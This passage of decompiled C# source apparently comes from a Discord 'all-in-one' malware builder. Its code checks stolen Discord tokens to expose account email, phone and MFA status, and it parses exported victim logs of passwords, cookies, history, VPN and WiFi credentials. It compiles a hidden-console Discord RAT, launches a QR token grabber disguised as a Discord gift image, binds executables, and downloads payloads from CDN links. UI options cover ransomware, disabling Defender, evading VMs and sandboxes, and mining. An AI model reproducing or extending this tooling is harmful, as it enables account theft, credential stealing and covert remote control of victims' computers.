            this.flooderEmbed.BackColor = Color.FromArgb(colorDialog.Color.A, colorDialog.Color.R, colorDialog.Color.G, colorDialog.Color.B);
        }
    }

    public static string getBetween(string strSource, string strStart, string strEnd)
    {
        if (strSource.Contains(strStart) && strSource.Contains(strEnd))
        {
            int num;
            num = strSource.IndexOf(strStart, 0) + strStart.Length;
            return strSource.Substring(num, strSource.IndexOf(strEnd, num) - num);
        }
        return "";
    }

    private void tokenChecker_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(this.TokenCheckerBox.Text) && !string.IsNullOrWhiteSpace(this.TokenCheckerBox.Text))
        {
            string value;
            value = this.TokenCheckerBox.Text;
            try
            {
                HttpRequest httpRequest;
                httpRequest = new HttpRequest();
                httpRequest.AddHeader("Authorization", value);
                string strSource;
                strSource = httpRequest.Get("https://discordapp.com/api/users/@me").ToString();
                string between;
                between = GForm0.getBetween(strSource, "username\": ", ",");
                string between2;
                between2 = GForm0.getBetween(strSource, "discriminator\": ", ",");
                string between3;
                between3 = GForm0.getBetween(strSource, "email\": ", ",");
                string between4;
                between4 = GForm0.getBetween(strSource, "phone\": ", "}");
                string between5;
                between5 = GForm0.getBetween(strSource, "id\": ", ",");
                string between6;
                between6 = GForm0.getBetween(strSource, "mfa_enabled\": ", ",");
                string between7;
                between7 = GForm0.getBetween(strSource, "verified\": ", ",");
                string between8;
                between8 = GForm0.getBetween(strSource, "avatar\": ", ",");
                this.tNameLabel.Text = between.Trim('"') + " #" + between2.Trim('"');
                this.tEmailLabel.Text = between3.Trim('"');
                this.tPhoneLabel.Text = between4.Trim('"');
                string text;
                text = between5.Trim('"');
                string text2;
                text2 = between6.Trim('"');
                string text3;
                text3 = between7.Trim('"');
                string text4;
                text4 = between8.Trim('"');
                this.tIDLabel.Text = text;
                string text5;
                text5 = this.disabled;
                if (text2 == "true")
                {
                    text5 = this.enabled;
                }
                this.tMFALabel.Text = text5;
                string text6;
                text6 = this.unverified;
                if (text3 == "true")
                {
                    text6 = this.verified;
                }
                this.tVLabel.Text = text6;
                using WebResponse webResponse = WebRequest.Create("https://cdn.discordapp.com/avatars/" + text + "/" + text4 + ".jpg").GetResponse();
                using Stream stream = webResponse.GetResponseStream();
                this.avatarBox.Image = Image.FromStream(stream);
                return;
            }
            catch
            {
                this.PopupMessage(this.invalidtoken);
                return;
            }
        }
        this.PopupMessage(this.tokencannotempt);
    }

    private void button8_Click(object sender, EventArgs e)
    {
        string value;
        value = this.TokenCheckerBox.Text;
        if (!string.IsNullOrEmpty(this.TokenCheckerBox.Text) && !string.IsNullOrWhiteSpace(this.TokenCheckerBox.Text))
        {
            try
            {
                HttpRequest httpRequest;
                httpRequest = new HttpRequest();
                httpRequest.AddHeader("Authorization", value);
                httpRequest.Post("https://discordapp.com/api/v6/invite/minecraft");
                return;
            }
            catch
            {
                this.PopupMessage(this.tokendeleted);
                return;
            }
        }
        this.PopupMessage(this.tokencannotempt);
    }

    private void checkBox2_CheckedChanged(object sender, EventArgs e)
    {
        if (this.checkBox2.Checked)
        {
            this.checkBox3.Checked = false;
            this.checkBox4.Checked = false;
        }
    }

    private void checkBox3_CheckedChanged(object sender, EventArgs e)
    {
        if (this.checkBox3.Checked)
        {
            this.checkBox2.Checked = false;
            this.checkBox4.Checked = false;
        }
    }

    private void checkBox4_CheckedChanged(object sender, EventArgs e)
    {
        if (this.checkBox4.Checked)
        {
            this.checkBox2.Checked = false;
            this.checkBox3.Checked = false;
        }
    }

    private void exportCredentials_Click(object sender, EventArgs e)
    {
        string text;
        text = "N/A";
        string text2;
        text2 = "N/A";
        string text3;
        text3 = "N/A";
        string text4;
        text4 = "N/A";
        string text5;
        text5 = "N/A";
        string text6;
        text6 = "N/A";
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "dAIO (*.dAIO)|*.dAIO";
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            string text7;
            text7 = File.ReadAllText(openFileDialog.FileName);
            string directoryName;
            directoryName = Path.GetDirectoryName(openFileDialog.FileName);
            this.dAIObox.Text = directoryName;
            if (text7.Contains("# Passwords"))
            {
                text = GForm0.getBetween(text7, "# Passwords", "# End of Passwords");
                using StreamWriter streamWriter = new StreamWriter("Passwords.txt");
                string[] array;
                array = Regex.Split(text, "\n");
                for (int i = 0; i < array.Length; i++)
                {
                    streamWriter.WriteLine(array[i]);
                }
            }
            else
            {
                this.PopupMessage(this.nopass);
            }
            if (text7.Contains("# Cookies"))
            {
                text2 = GForm0.getBetween(text7, "Cookies", "# End of Cookies");
                using StreamWriter streamWriter2 = new StreamWriter("Cookies.txt");
                string[] array;
                array = Regex.Split(text2, "\n");
                for (int i = 0; i < array.Length; i++)
                {
                    streamWriter2.WriteLine(array[i]);
                }
            }
            else
            {
                this.PopupMessage(this.nocookies);
            }
            if (text7.Contains("# History"))
            {
                text3 = GForm0.getBetween(text7, "History", "# End of History");
                using StreamWriter streamWriter3 = new StreamWriter("History.txt");
                string[] array;
                array = Regex.Split(text3, "\n");
                for (int i = 0; i < array.Length; i++)
                {
                    streamWriter3.WriteLine(array[i]);
                }
            }
            else
            {
                this.PopupMessage(this.nohistory);
            }
            if (text7.Contains("# NordVPN"))
            {
                text4 = GForm0.getBetween(text7, "NordVPN", "# End of NordVPN");
                using StreamWriter streamWriter4 = new StreamWriter("NordVPN.txt");
                string[] array;
                array = Regex.Split(text4, "\n");
                for (int i = 0; i < array.Length; i++)
                {
                    streamWriter4.WriteLine(array[i]);
                }
            }
            else
            {
                this.PopupMessage(this.novpn);
            }
            if (text7.Contains("# Wifi Network"))
            {
                text6 = GForm0.getBetween(text7, "Wifi Network", "# End of Wifi Network");
                using StreamWriter streamWriter5 = new StreamWriter("WiFiNetwork.txt");
                string[] array;
                array = Regex.Split(text6, "\n");
                for (int i = 0; i < array.Length; i++)
                {
                    streamWriter5.WriteLine(array[i]);
                }
            }
            else
            {
                this.PopupMessage(this.nowifinetwork);
            }
            if (text7.Contains("# Wifi Password") && text7.Contains("# Wifi Network"))
            {
                text5 = GForm0.getBetween(text7, "Wifi Password", "# End of Wifi Password");
                using StreamWriter streamWriter6 = new StreamWriter("WiFiPasswords.txt");
                string[] array;
                array = Regex.Split(text5, "\n");
                for (int i = 0; i < array.Length; i++)
                {
                    streamWriter6.WriteLine(array[i]);
                }
                return;
            }
            this.PopupMessage(this.nowifipass);
        }
        catch
        {
        }
    }

    private bool checkIfPythonIsInstalled()
    {
        Process process;
        process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/C py --version";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        bool result;
        result = (process.StandardOutput.ReadToEnd().Contains("Python") ? true : false);
        process.WaitForExit();
        return result;
    }

    private void ratInstallButton_Click(object sender, EventArgs e)
    {
        if (this.checkIfPythonIsInstalled())
        {
            if (this.pipBox.Checked)
            {
                Process process;
                process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.WorkingDirectory = this.aioDir;
                process.StartInfo.Arguments = "/C py -m pip install -r requirements.txt";
                process.StartInfo.UseShellExecute = true;
                process.Start();
                process.WaitForExit();
                Process process2;
                process2 = new Process();
                process2.StartInfo.FileName = "cmd.exe";
                process2.StartInfo.Arguments = "/C py -m pip install pyinstaller";
                process2.StartInfo.UseShellExecute = true;
                process2.Start();
                process2.WaitForExit();
                this.PopupMessage("All dependencies were installed.");
            }
            else
            {
                Process process3;
                process3 = new Process();
                process3.StartInfo.FileName = "cmd.exe";
                process3.StartInfo.Arguments = "/C py -m ensurepip";
                process3.StartInfo.UseShellExecute = true;
                process3.Start();
                process3.WaitForExit();
                Process process4;
                process4 = new Process();
                process4.StartInfo.FileName = "cmd.exe";
                process4.StartInfo.WorkingDirectory = this.aioDir;
                process4.StartInfo.Arguments = "/C py -m pip install -r requirements.txt";
                process4.StartInfo.UseShellExecute = true;
                process4.Start();
                process4.WaitForExit();
                Process process5;
                process5 = new Process();
                process5.StartInfo.FileName = "cmd.exe";
                process5.StartInfo.Arguments = "/C py -m pip install pyinstaller";
                process5.StartInfo.UseShellExecute = true;
                process5.Start();
                process5.WaitForExit();
                this.PopupMessage("All dependencies were installed.");
            }
        }
        else
        {
            this.PopupMessage("You need to install python first!\nOr the wrong version is installed.");
        }
    }

    private void insertButton_Click(object sender, EventArgs e)
    {
        File.WriteAllText(contents: File.ReadAllText(this.aioDir + "\\DiscordRAT.py").Replace("%mytokenrighthere%", this.ratTokenBox.Text), path: this.aioDir + "\\DiscordRAT.py");
        this.PopupMessage("Token inserted.");
    }

    private void ratCompileButton_Click(object sender, EventArgs e)
    {
        string folderPath;
        folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        Process process;
        process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.WorkingDirectory = this.aioDir;
        process.StartInfo.Arguments = "/C py -m PyInstaller --onefile --noconsole \"DiscordRAT.py\"";
        process.StartInfo.UseShellExecute = true;
        process.Start();
        process.WaitForExit();
        File.Delete(this.aioDir + "\\DiscordRAT.py");
        try
        {
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", this.aioDir + "\\DiscordRAT.py");
        }
        catch
        {
        }
        File.Delete(this.aioDir + "\\DiscordRAT.spec");
        File.Move(this.aioDir + "\\dist\\DiscordRAT.exe", folderPath + "\\DiscordRAT.exe");
        this.PopupMessage("Discord RAT compiled.\n[It is placed on your desktop]\nPlease follow the instructions.");
        Directory.Delete(this.aioDir + "\\__pycache__", recursive: true);
        Directory.Delete(this.aioDir + "\\build", recursive: true);
        Directory.Delete(this.aioDir + "\\dist", recursive: true);
    }

    private void saveButton_Click(object sender, EventArgs e)
    {
        Settings.Default["ui_Color"] = this.cButton;
        Settings.Default["show_Username"] = this.ynBtn;
        Settings.Default.Save();
        this.PopupMessage("Settings saved.");
    }

    private void dAIOmain_Move(object sender, EventArgs e)
    {
        if (this.moving)
        {
            base.Opacity = 0.5;
        }
    }

    private void dAIOmain_ResizeEnd(object sender, EventArgs e)
    {
        base.Opacity = 1.0;
    }

    private void page1_Click(object sender, EventArgs e)
    {
        this.page1.Font = this.biggerOne;
        this.page2.Font = this.smallOne;
        this.pageNow = 1;
        this.btnDashboard.Show();
        this.ratButton.Show();
        this.btnParty.Show();
        this.btnMap.Show();
        this.btnWork.Show();
        this.btnInventory.Show();
        this.qrButton.Hide();
        this.binderButton.Hide();
        this.pnlNav.Height = this.btnDashboard.Height;
        this.pnlNav.Top = this.btnDashboard.Top;
        this.pnlNav.Left = this.btnDashboard.Left;
        this.btnDashboard.BackColor = Color.FromArgb(11, 11, 11);
        this.binderSite.Hide();
        this.qrSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.mainSite.Show();
        this.qrButton.BackColor = Color.FromArgb(8, 8, 8);
        this.binderButton.BackColor = Color.FromArgb(8, 8, 8);
        this.ratButton.BackColor = Color.FromArgb(8, 8, 8);
        this.btnParty.BackColor = Color.FromArgb(8, 8, 8);
        this.btnWork.BackColor = Color.FromArgb(8, 8, 8);
        this.btnInventory.BackColor = Color.FromArgb(8, 8, 8);
        this.btnMap.BackColor = Color.FromArgb(8, 8, 8);
        this.btnSettings.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void page2_Click(object sender, EventArgs e)
    {
        this.page2.Font = this.biggerOne;
        this.page1.Font = this.smallOne;
        this.pageNow = 2;
        this.btnDashboard.Hide();
        this.ratButton.Hide();
        this.btnParty.Hide();
        this.btnMap.Hide();
        this.btnWork.Hide();
        this.btnInventory.Hide();
        this.qrButton.Show();
        this.binderButton.Show();
        this.pnlNav.Height = this.qrButton.Height;
        this.pnlNav.Top = this.qrButton.Top;
        this.pnlNav.Left = this.qrButton.Left;
        this.qrButton.BackColor = Color.FromArgb(11, 11, 11);
        this.ratButton.BackColor = Color.FromArgb(8, 8, 8);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.btnParty.BackColor = Color.FromArgb(8, 8, 8);
        this.btnWork.BackColor = Color.FromArgb(8, 8, 8);
        this.btnInventory.BackColor = Color.FromArgb(8, 8, 8);
        this.btnMap.BackColor = Color.FromArgb(8, 8, 8);
        this.btnSettings.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.binderSite.Hide();
        this.qrSite.Show();
    }

    private void qrButton_Leave(object sender, EventArgs e)
    {
        this.qrButton.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void qrButton_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.qrButton.Height;
        this.pnlNav.Top = this.qrButton.Top;
        this.pnlNav.Left = this.qrButton.Left;
        this.qrButton.BackColor = Color.FromArgb(11, 11, 11);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.binderSite.Hide();
        this.qrSite.Show();
    }

    private void minimizeBtn_Click(object sender, EventArgs e)
    {
        base.WindowState = FormWindowState.Minimized;
    }

    private void button7_Click(object sender, EventArgs e)
    {
        if (this.checkIfPythonIsInstalled())
        {
            Process process;
            process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.WorkingDirectory = this.aioDir + "\\QRGrabber";
            process.StartInfo.Arguments = "/C py -m pip install -r requirements.txt";
            process.StartInfo.UseShellExecute = true;
            process.Start();
            process.WaitForExit();
            this.PopupMessage("All dependencies were installed.");
        }
        else
        {
            this.PopupMessage("You need to install python first!\nOr the wrong version is installed.");
        }
    }

    private void qrStartBtn_Click(object sender, EventArgs e)
    {
        string folderPath;
        folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        Process process;
        process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.WorkingDirectory = this.aioDir + "\\QRGrabber";
        process.StartInfo.Arguments = "/K py QR_Generator.py";
        process.StartInfo.UseShellExecute = false;
        process.Start();
        base.Opacity = 0.7;
        if (File.Exists(folderPath + "\\discord_gift.png"))
        {
            File.Delete(folderPath + "\\discord_gift.png");
        }
        File.Copy(this.aioDir + "\\QRGrabber\\discord_gift.png", folderPath + "\\discord_gift.png");
        process.WaitForExit();
        base.Opacity = 1.0;
    }

    private void fixButton_Click(object sender, EventArgs e)
    {
        if (!Directory.Exists(this.aioDir))
        {
            Directory.CreateDirectory(this.aioDir);
            Directory.CreateDirectory(this.aioDir + "\\QRGrabber");
            try
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973555367231508500/requirements.txt", this.aioDir + "\\requirements.txt");
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", this.aioDir + "\\DiscordRAT.py");
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557313912864788/QRG.zip", this.aioDir + "\\QRG.zip");
                ZipFile.ExtractToDirectory(this.aioDir + "\\QRG.zip", this.aioDir + "\\QRGrabber");
                File.Delete(this.aioDir + "\\QRG.zip");
                return;
            }
            catch
            {
                return;
            }
        }
        new DirectoryInfo(this.aioDir).Delete(recursive: true);
        Directory.CreateDirectory(this.aioDir);
        Directory.CreateDirectory(this.aioDir + "\\QRGrabber");
        try
        {
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973555367231508500/requirements.txt", this.aioDir + "\\requirements.txt");
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", this.aioDir + "\\DiscordRAT.py");
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557313912864788/QRG.zip", this.aioDir + "\\QRG.zip");
            ZipFile.ExtractToDirectory(this.aioDir + "\\QRG.zip", this.aioDir + "\\QRGrabber");
            File.Delete(this.aioDir + "\\QRG.zip");
        }
        catch
        {
        }
    }

    private void binderButton_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.binderButton.Height;
        this.pnlNav.Top = this.binderButton.Top;
        this.pnlNav.Left = this.binderButton.Left;
        this.binderButton.BackColor = Color.FromArgb(11, 11, 11);
        this.qrButton.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.binderSite.Show();
    }

    private void binderButton_Leave(object sender, EventArgs e)
    {
        this.binderButton.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void button11_Click(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog;
        openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        openFileDialog.Title = "Select file to bind";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            this.label56.Text = openFileDialog.FileName;
            this.label56.ForeColor = Color.DarkRed;
            GForm0.exe1 = Path.GetFullPath(openFileDialog.FileName);
            GForm0.ifExe1 = true;
        }
    }

    private void button9_Click(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog;
        openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        openFileDialog.Title = "Select file to bind";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            this.label60.Text = openFileDialog.FileName;
            this.label60.ForeColor = Color.DarkRed;
            GForm0.exe2 = Path.GetFullPath(openFileDialog.FileName);
            GForm0.ifExe2 = true;
        }
    }

    private void button10_Click(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog;
        openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        openFileDialog.Title = "Select file to bind";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            this.label61.Text = openFileDialog.FileName;
            this.label61.ForeColor = Color.DarkRed;
            GForm0.exe3 = Path.GetFullPath(openFileDialog.FileName);
            GForm0.ifExe3 = true;
        }
    }

    private void button12_Click(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog;
        openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        openFileDialog.Title = "Select file to bind";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            this.label62.Text = openFileDialog.FileName;
            this.label62.ForeColor = Color.DarkRed;
            GForm0.exe4 = Path.GetFullPath(openFileDialog.FileName);
            GForm0.ifExe4 = true;
        }
    }

    private void button13_Click(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog;
        openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        openFileDialog.Title = "Select file to bind";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            this.label63.Text = openFileDialog.FileName;
            this.label63.ForeColor = Color.DarkRed;
            GForm0.exe5 = Path.GetFullPath(openFileDialog.FileName);
            GForm0.ifExe5 = true;
        }
    }

    private static byte[] Generate256BitsOfRandomEntropy()
    {
        byte[] array;
        array = new byte[32];
        using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
        rNGCryptoServiceProvider.GetBytes(array);
        return array;
    }

    public static string Encrypt(string plainText)
    {
        byte[] array;
        array = GForm0.Generate256BitsOfRandomEntropy();
        byte[] array2;
        array2 = GForm0.Generate256BitsOfRandomEntropy();
        byte[] bytes;
        bytes = Encoding.UTF8.GetBytes(plainText);
        using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("JRLpmxDuzEpHFFJDrThphvBFFpgAmVnGWttWzBJXTxHxmrbDrPVDRcxVPKBAjwBcUkJtqUkzwtHsgZkbNNNvZYhumBvAYakevKeH", array, 1000);
        byte[] bytes2;
        bytes2 = rfc2898DeriveBytes.GetBytes(32);
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.BlockSize = 256;
        rijndaelManaged.Mode = CipherMode.CBC;
        rijndaelManaged.Padding = PaddingMode.PKCS7;
        using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes2, array2);
        using MemoryStream memoryStream = new MemoryStream();
        using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
        cryptoStream.Write(bytes, 0, bytes.Length);
        cryptoStream.FlushFinalBlock();
        byte[] inArray;
        inArray = array.Concat(array2).ToArray().Concat(memoryStream.ToArray())
            .ToArray();
        memoryStream.Close();
        cryptoStream.Close();
        return Convert.ToBase64String(inArray);
    }

    private void fakesButton_Click(object sender, EventArgs e)
    {
        this.additionalSite.Hide();
        this.fakesSite.Show();
    }

    private void backButton_Click(object sender, EventArgs e)
    {
        this.fakesSite.Hide();
        this.additionalSite.Show();
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(GForm0));
            this.sidePanel = new System.Windows.Forms.Panel();
            this.page2 = new System.Windows.Forms.Label();
            this.page1 = new System.Windows.Forms.Label();
            this.pnlNav = new System.Windows.Forms.Panel();
            this.binderButton = new System.Windows.Forms.Button();
            this.btnInventory = new System.Windows.Forms.Button();
            this.btnSettings = new System.Windows.Forms.Button();
            this.ratButton = new System.Windows.Forms.Button();
            this.btnParty = new System.Windows.Forms.Button();
            this.btnMap = new System.Windows.Forms.Button();
            this.btnWork = new System.Windows.Forms.Button();
            this.qrButton = new System.Windows.Forms.Button();
            this.btnDashboard = new System.Windows.Forms.Button();
            this.panel2 = new System.Windows.Forms.Panel();
            this.usernameLabel = new System.Windows.Forms.Label();
            this.settingsSite = new System.Windows.Forms.Panel();
            this.saveButton = new System.Windows.Forms.Button();
            this.translateLabel = new System.Windows.Forms.Label();
            this.arabicButton = new System.Windows.Forms.Button();
            this.germanButton = new System.Windows.Forms.Button();
            this.turkishButton = new System.Windows.Forms.Button();
            this.spanishButton = new System.Windows.Forms.Button();
            this.polishButton = new System.Windows.Forms.Button();
            this.frenchButton = new System.Windows.Forms.Button();
            this.russianButton = new System.Windows.Forms.Button();
            this.englishButton = new System.Windows.Forms.Button();
            this.label47 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.button3 = new System.Windows.Forms.Button();
            this.shNo = new System.Windows.Forms.Button();
            this.fixButton = new System.Windows.Forms.Button();
            this.btnUpdates = new System.Windows.Forms.Button();
            this.shYes = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.redButton = new System.Windows.Forms.Button();
            this.label5 = new System.Windows.Forms.Label();
            this.versionLabel = new System.Windows.Forms.Label();
            this.checkingLabel = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.mainSite = new System.Windows.Forms.Panel();
            this.label38 = new System.Windows.Forms.Label();
            this.embedBox = new System.Windows.Forms.PictureBox();
            this.colorSelect = new System.Windows.Forms.Button();
            this.label9 = new System.Windows.Forms.Label();
            this.cloneButton = new System.Windows.Forms.Button();
            this.generateButton = new System.Windows.Forms.Button();
            this.fileinfoLabel = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.iconUpload = new System.Windows.Forms.Button();
            this.iconBox = new System.Windows.Forms.PictureBox();
            this.label6 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.inspectorSite = new System.Windows.Forms.Panel();
            this.label16 = new System.Windows.Forms.Label();
            this.exportCredentials = new System.Windows.Forms.Button();
            this.winBox = new System.Windows.Forms.TextBox();
            this.additionalSite = new System.Windows.Forms.Panel();
            this.fakesButton = new System.Windows.Forms.Button();
            this.ratBox = new System.Windows.Forms.CheckBox();
            this.dinternetBox = new System.Windows.Forms.CheckBox();
            this.pluginSource = new ScintillaNET.Scintilla();
            this.label21 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.fakeMessageBox = new System.Windows.Forms.TextBox();
            this.faketitleBox = new System.Windows.Forms.TextBox();
            this.label19 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.ransomBox = new System.Windows.Forms.CheckBox();
            this.emuBox = new System.Windows.Forms.CheckBox();
            this.sandboxBox = new System.Windows.Forms.CheckBox();
            this.vmBox = new System.Windows.Forms.CheckBox();
            this.debugBox = new System.Windows.Forms.CheckBox();
            this.sniffersBox = new System.Windows.Forms.CheckBox();
            this.cryptoBox = new System.Windows.Forms.CheckBox();
            this.inputdBox = new System.Windows.Forms.CheckBox();
            this.jumpscareBox = new System.Windows.Forms.CheckBox();
            this.blockerBox = new System.Windows.Forms.CheckBox();
            this.pluginBox = new System.Windows.Forms.CheckBox();
            this.bsodBox = new System.Windows.Forms.CheckBox();
            this.taskmanagerBox = new System.Windows.Forms.CheckBox();
            this.defenderBox = new System.Windows.Forms.CheckBox();
            this.startupBox = new System.Windows.Forms.CheckBox();
            this.errorBox = new System.Windows.Forms.CheckBox();
            this.obfuscateBox = new System.Windows.Forms.CheckBox();
            this.label17 = new System.Windows.Forms.Label();
            this.tokenBox = new System.Windows.Forms.TextBox();
            this.macBox = new System.Windows.Forms.TextBox();
            this.ipBox = new System.Windows.Forms.TextBox();
            this.nameBox = new System.Windows.Forms.TextBox();
            this.label15 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.dAIOupload = new System.Windows.Forms.Button();
            this.label14 = new System.Windows.Forms.Label();
            this.dAIObox = new System.Windows.Forms.TextBox();
            this.pumpBox = new System.Windows.Forms.TextBox();
            this.label28 = new System.Windows.Forms.Label();
            this.pumpButton = new System.Windows.Forms.Button();
            this.miscSite = new System.Windows.Forms.Panel();
            this.tVLabel = new System.Windows.Forms.Label();
            this.tMFALabel = new System.Windows.Forms.Label();
            this.tIDLabel = new System.Windows.Forms.Label();
            this.tPhoneLabel = new System.Windows.Forms.Label();
            this.tEmailLabel = new System.Windows.Forms.Label();
            this.tNameLabel = new System.Windows.Forms.Label();
            this.avatarBox = new System.Windows.Forms.PictureBox();
            this.button8 = new System.Windows.Forms.Button();
            this.label36 = new System.Windows.Forms.Label();
            this.label35 = new System.Windows.Forms.Label();
            this.label34 = new System.Windows.Forms.Label();
            this.label33 = new System.Windows.Forms.Label();
            this.label32 = new System.Windows.Forms.Label();
            this.label31 = new System.Windows.Forms.Label();
            this.label30 = new System.Windows.Forms.Label();
            this.flooderEmbed = new System.Windows.Forms.PictureBox();
            this.flooderEmSelect = new System.Windows.Forms.Button();
            this.label27 = new System.Windows.Forms.Label();
            this.safeBox = new System.Windows.Forms.CheckBox();
            this.label26 = new System.Windows.Forms.Label();
            this.wdeleteButton = new System.Windows.Forms.Button();
            this.label25 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label23 = new System.Windows.Forms.Label();
            this.userBox = new System.Windows.Forms.TextBox();
            this.tokenChecker = new System.Windows.Forms.Button();
            this.label29 = new System.Windows.Forms.Label();
            this.button4 = new System.Windows.Forms.Button();
            this.TokenCheckerBox = new System.Windows.Forms.TextBox();
            this.label22 = new System.Windows.Forms.Label();
            this.miscWebhookBox = new System.Windows.Forms.TextBox();
            this.gbBox = new System.Windows.Forms.CheckBox();
            this.mbBox = new System.Windows.Forms.CheckBox();
            this.kbBox = new System.Windows.Forms.CheckBox();
            this.pumpPathBox = new System.Windows.Forms.TextBox();
            this.minerSite = new System.Windows.Forms.Panel();
            this.label37 = new System.Windows.Forms.Label();
            this.label52 = new System.Windows.Forms.Label();
            this.label53 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.label54 = new System.Windows.Forms.Label();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.checkBox2 = new System.Windows.Forms.CheckBox();
            this.checkBox3 = new System.Windows.Forms.CheckBox();
            this.checkBox4 = new System.Windows.Forms.CheckBox();
            this.label57 = new System.Windows.Forms.Label();
            this.textBox6 = new System.Windows.Forms.TextBox();
            this.ratSite = new System.Windows.Forms.Panel();
            this.ratCompileButton = new System.Windows.Forms.Button();
            this.label45 = new System.Windows.Forms.Label();
            this.insertButton = new System.Windows.Forms.Button();
            this.label43 = new System.Windows.Forms.Label();
            this.pipBox = new System.Windows.Forms.CheckBox();
            this.label42 = new System.Windows.Forms.Label();
            this.ratTokenBox = new System.Windows.Forms.TextBox();
            this.label40 = new System.Windows.Forms.Label();
            this.ratInstallButton = new System.Windows.Forms.Button();
            this.label41 = new System.Windows.Forms.Label();
            this.label44 = new System.Windows.Forms.Label();
            this.rURLBox = new System.Windows.Forms.TextBox();
            this.qrSite = new System.Windows.Forms.Panel();
            this.label51 = new System.Windows.Forms.Label();
            this.button7 = new System.Windows.Forms.Button();
            this.label50 = new System.Windows.Forms.Label();
            this.qrStartBtn = new System.Windows.Forms.Button();
            this.label46 = new System.Windows.Forms.Label();
            this.binderSite = new System.Windows.Forms.Panel();
            this.label64 = new System.Windows.Forms.Label();
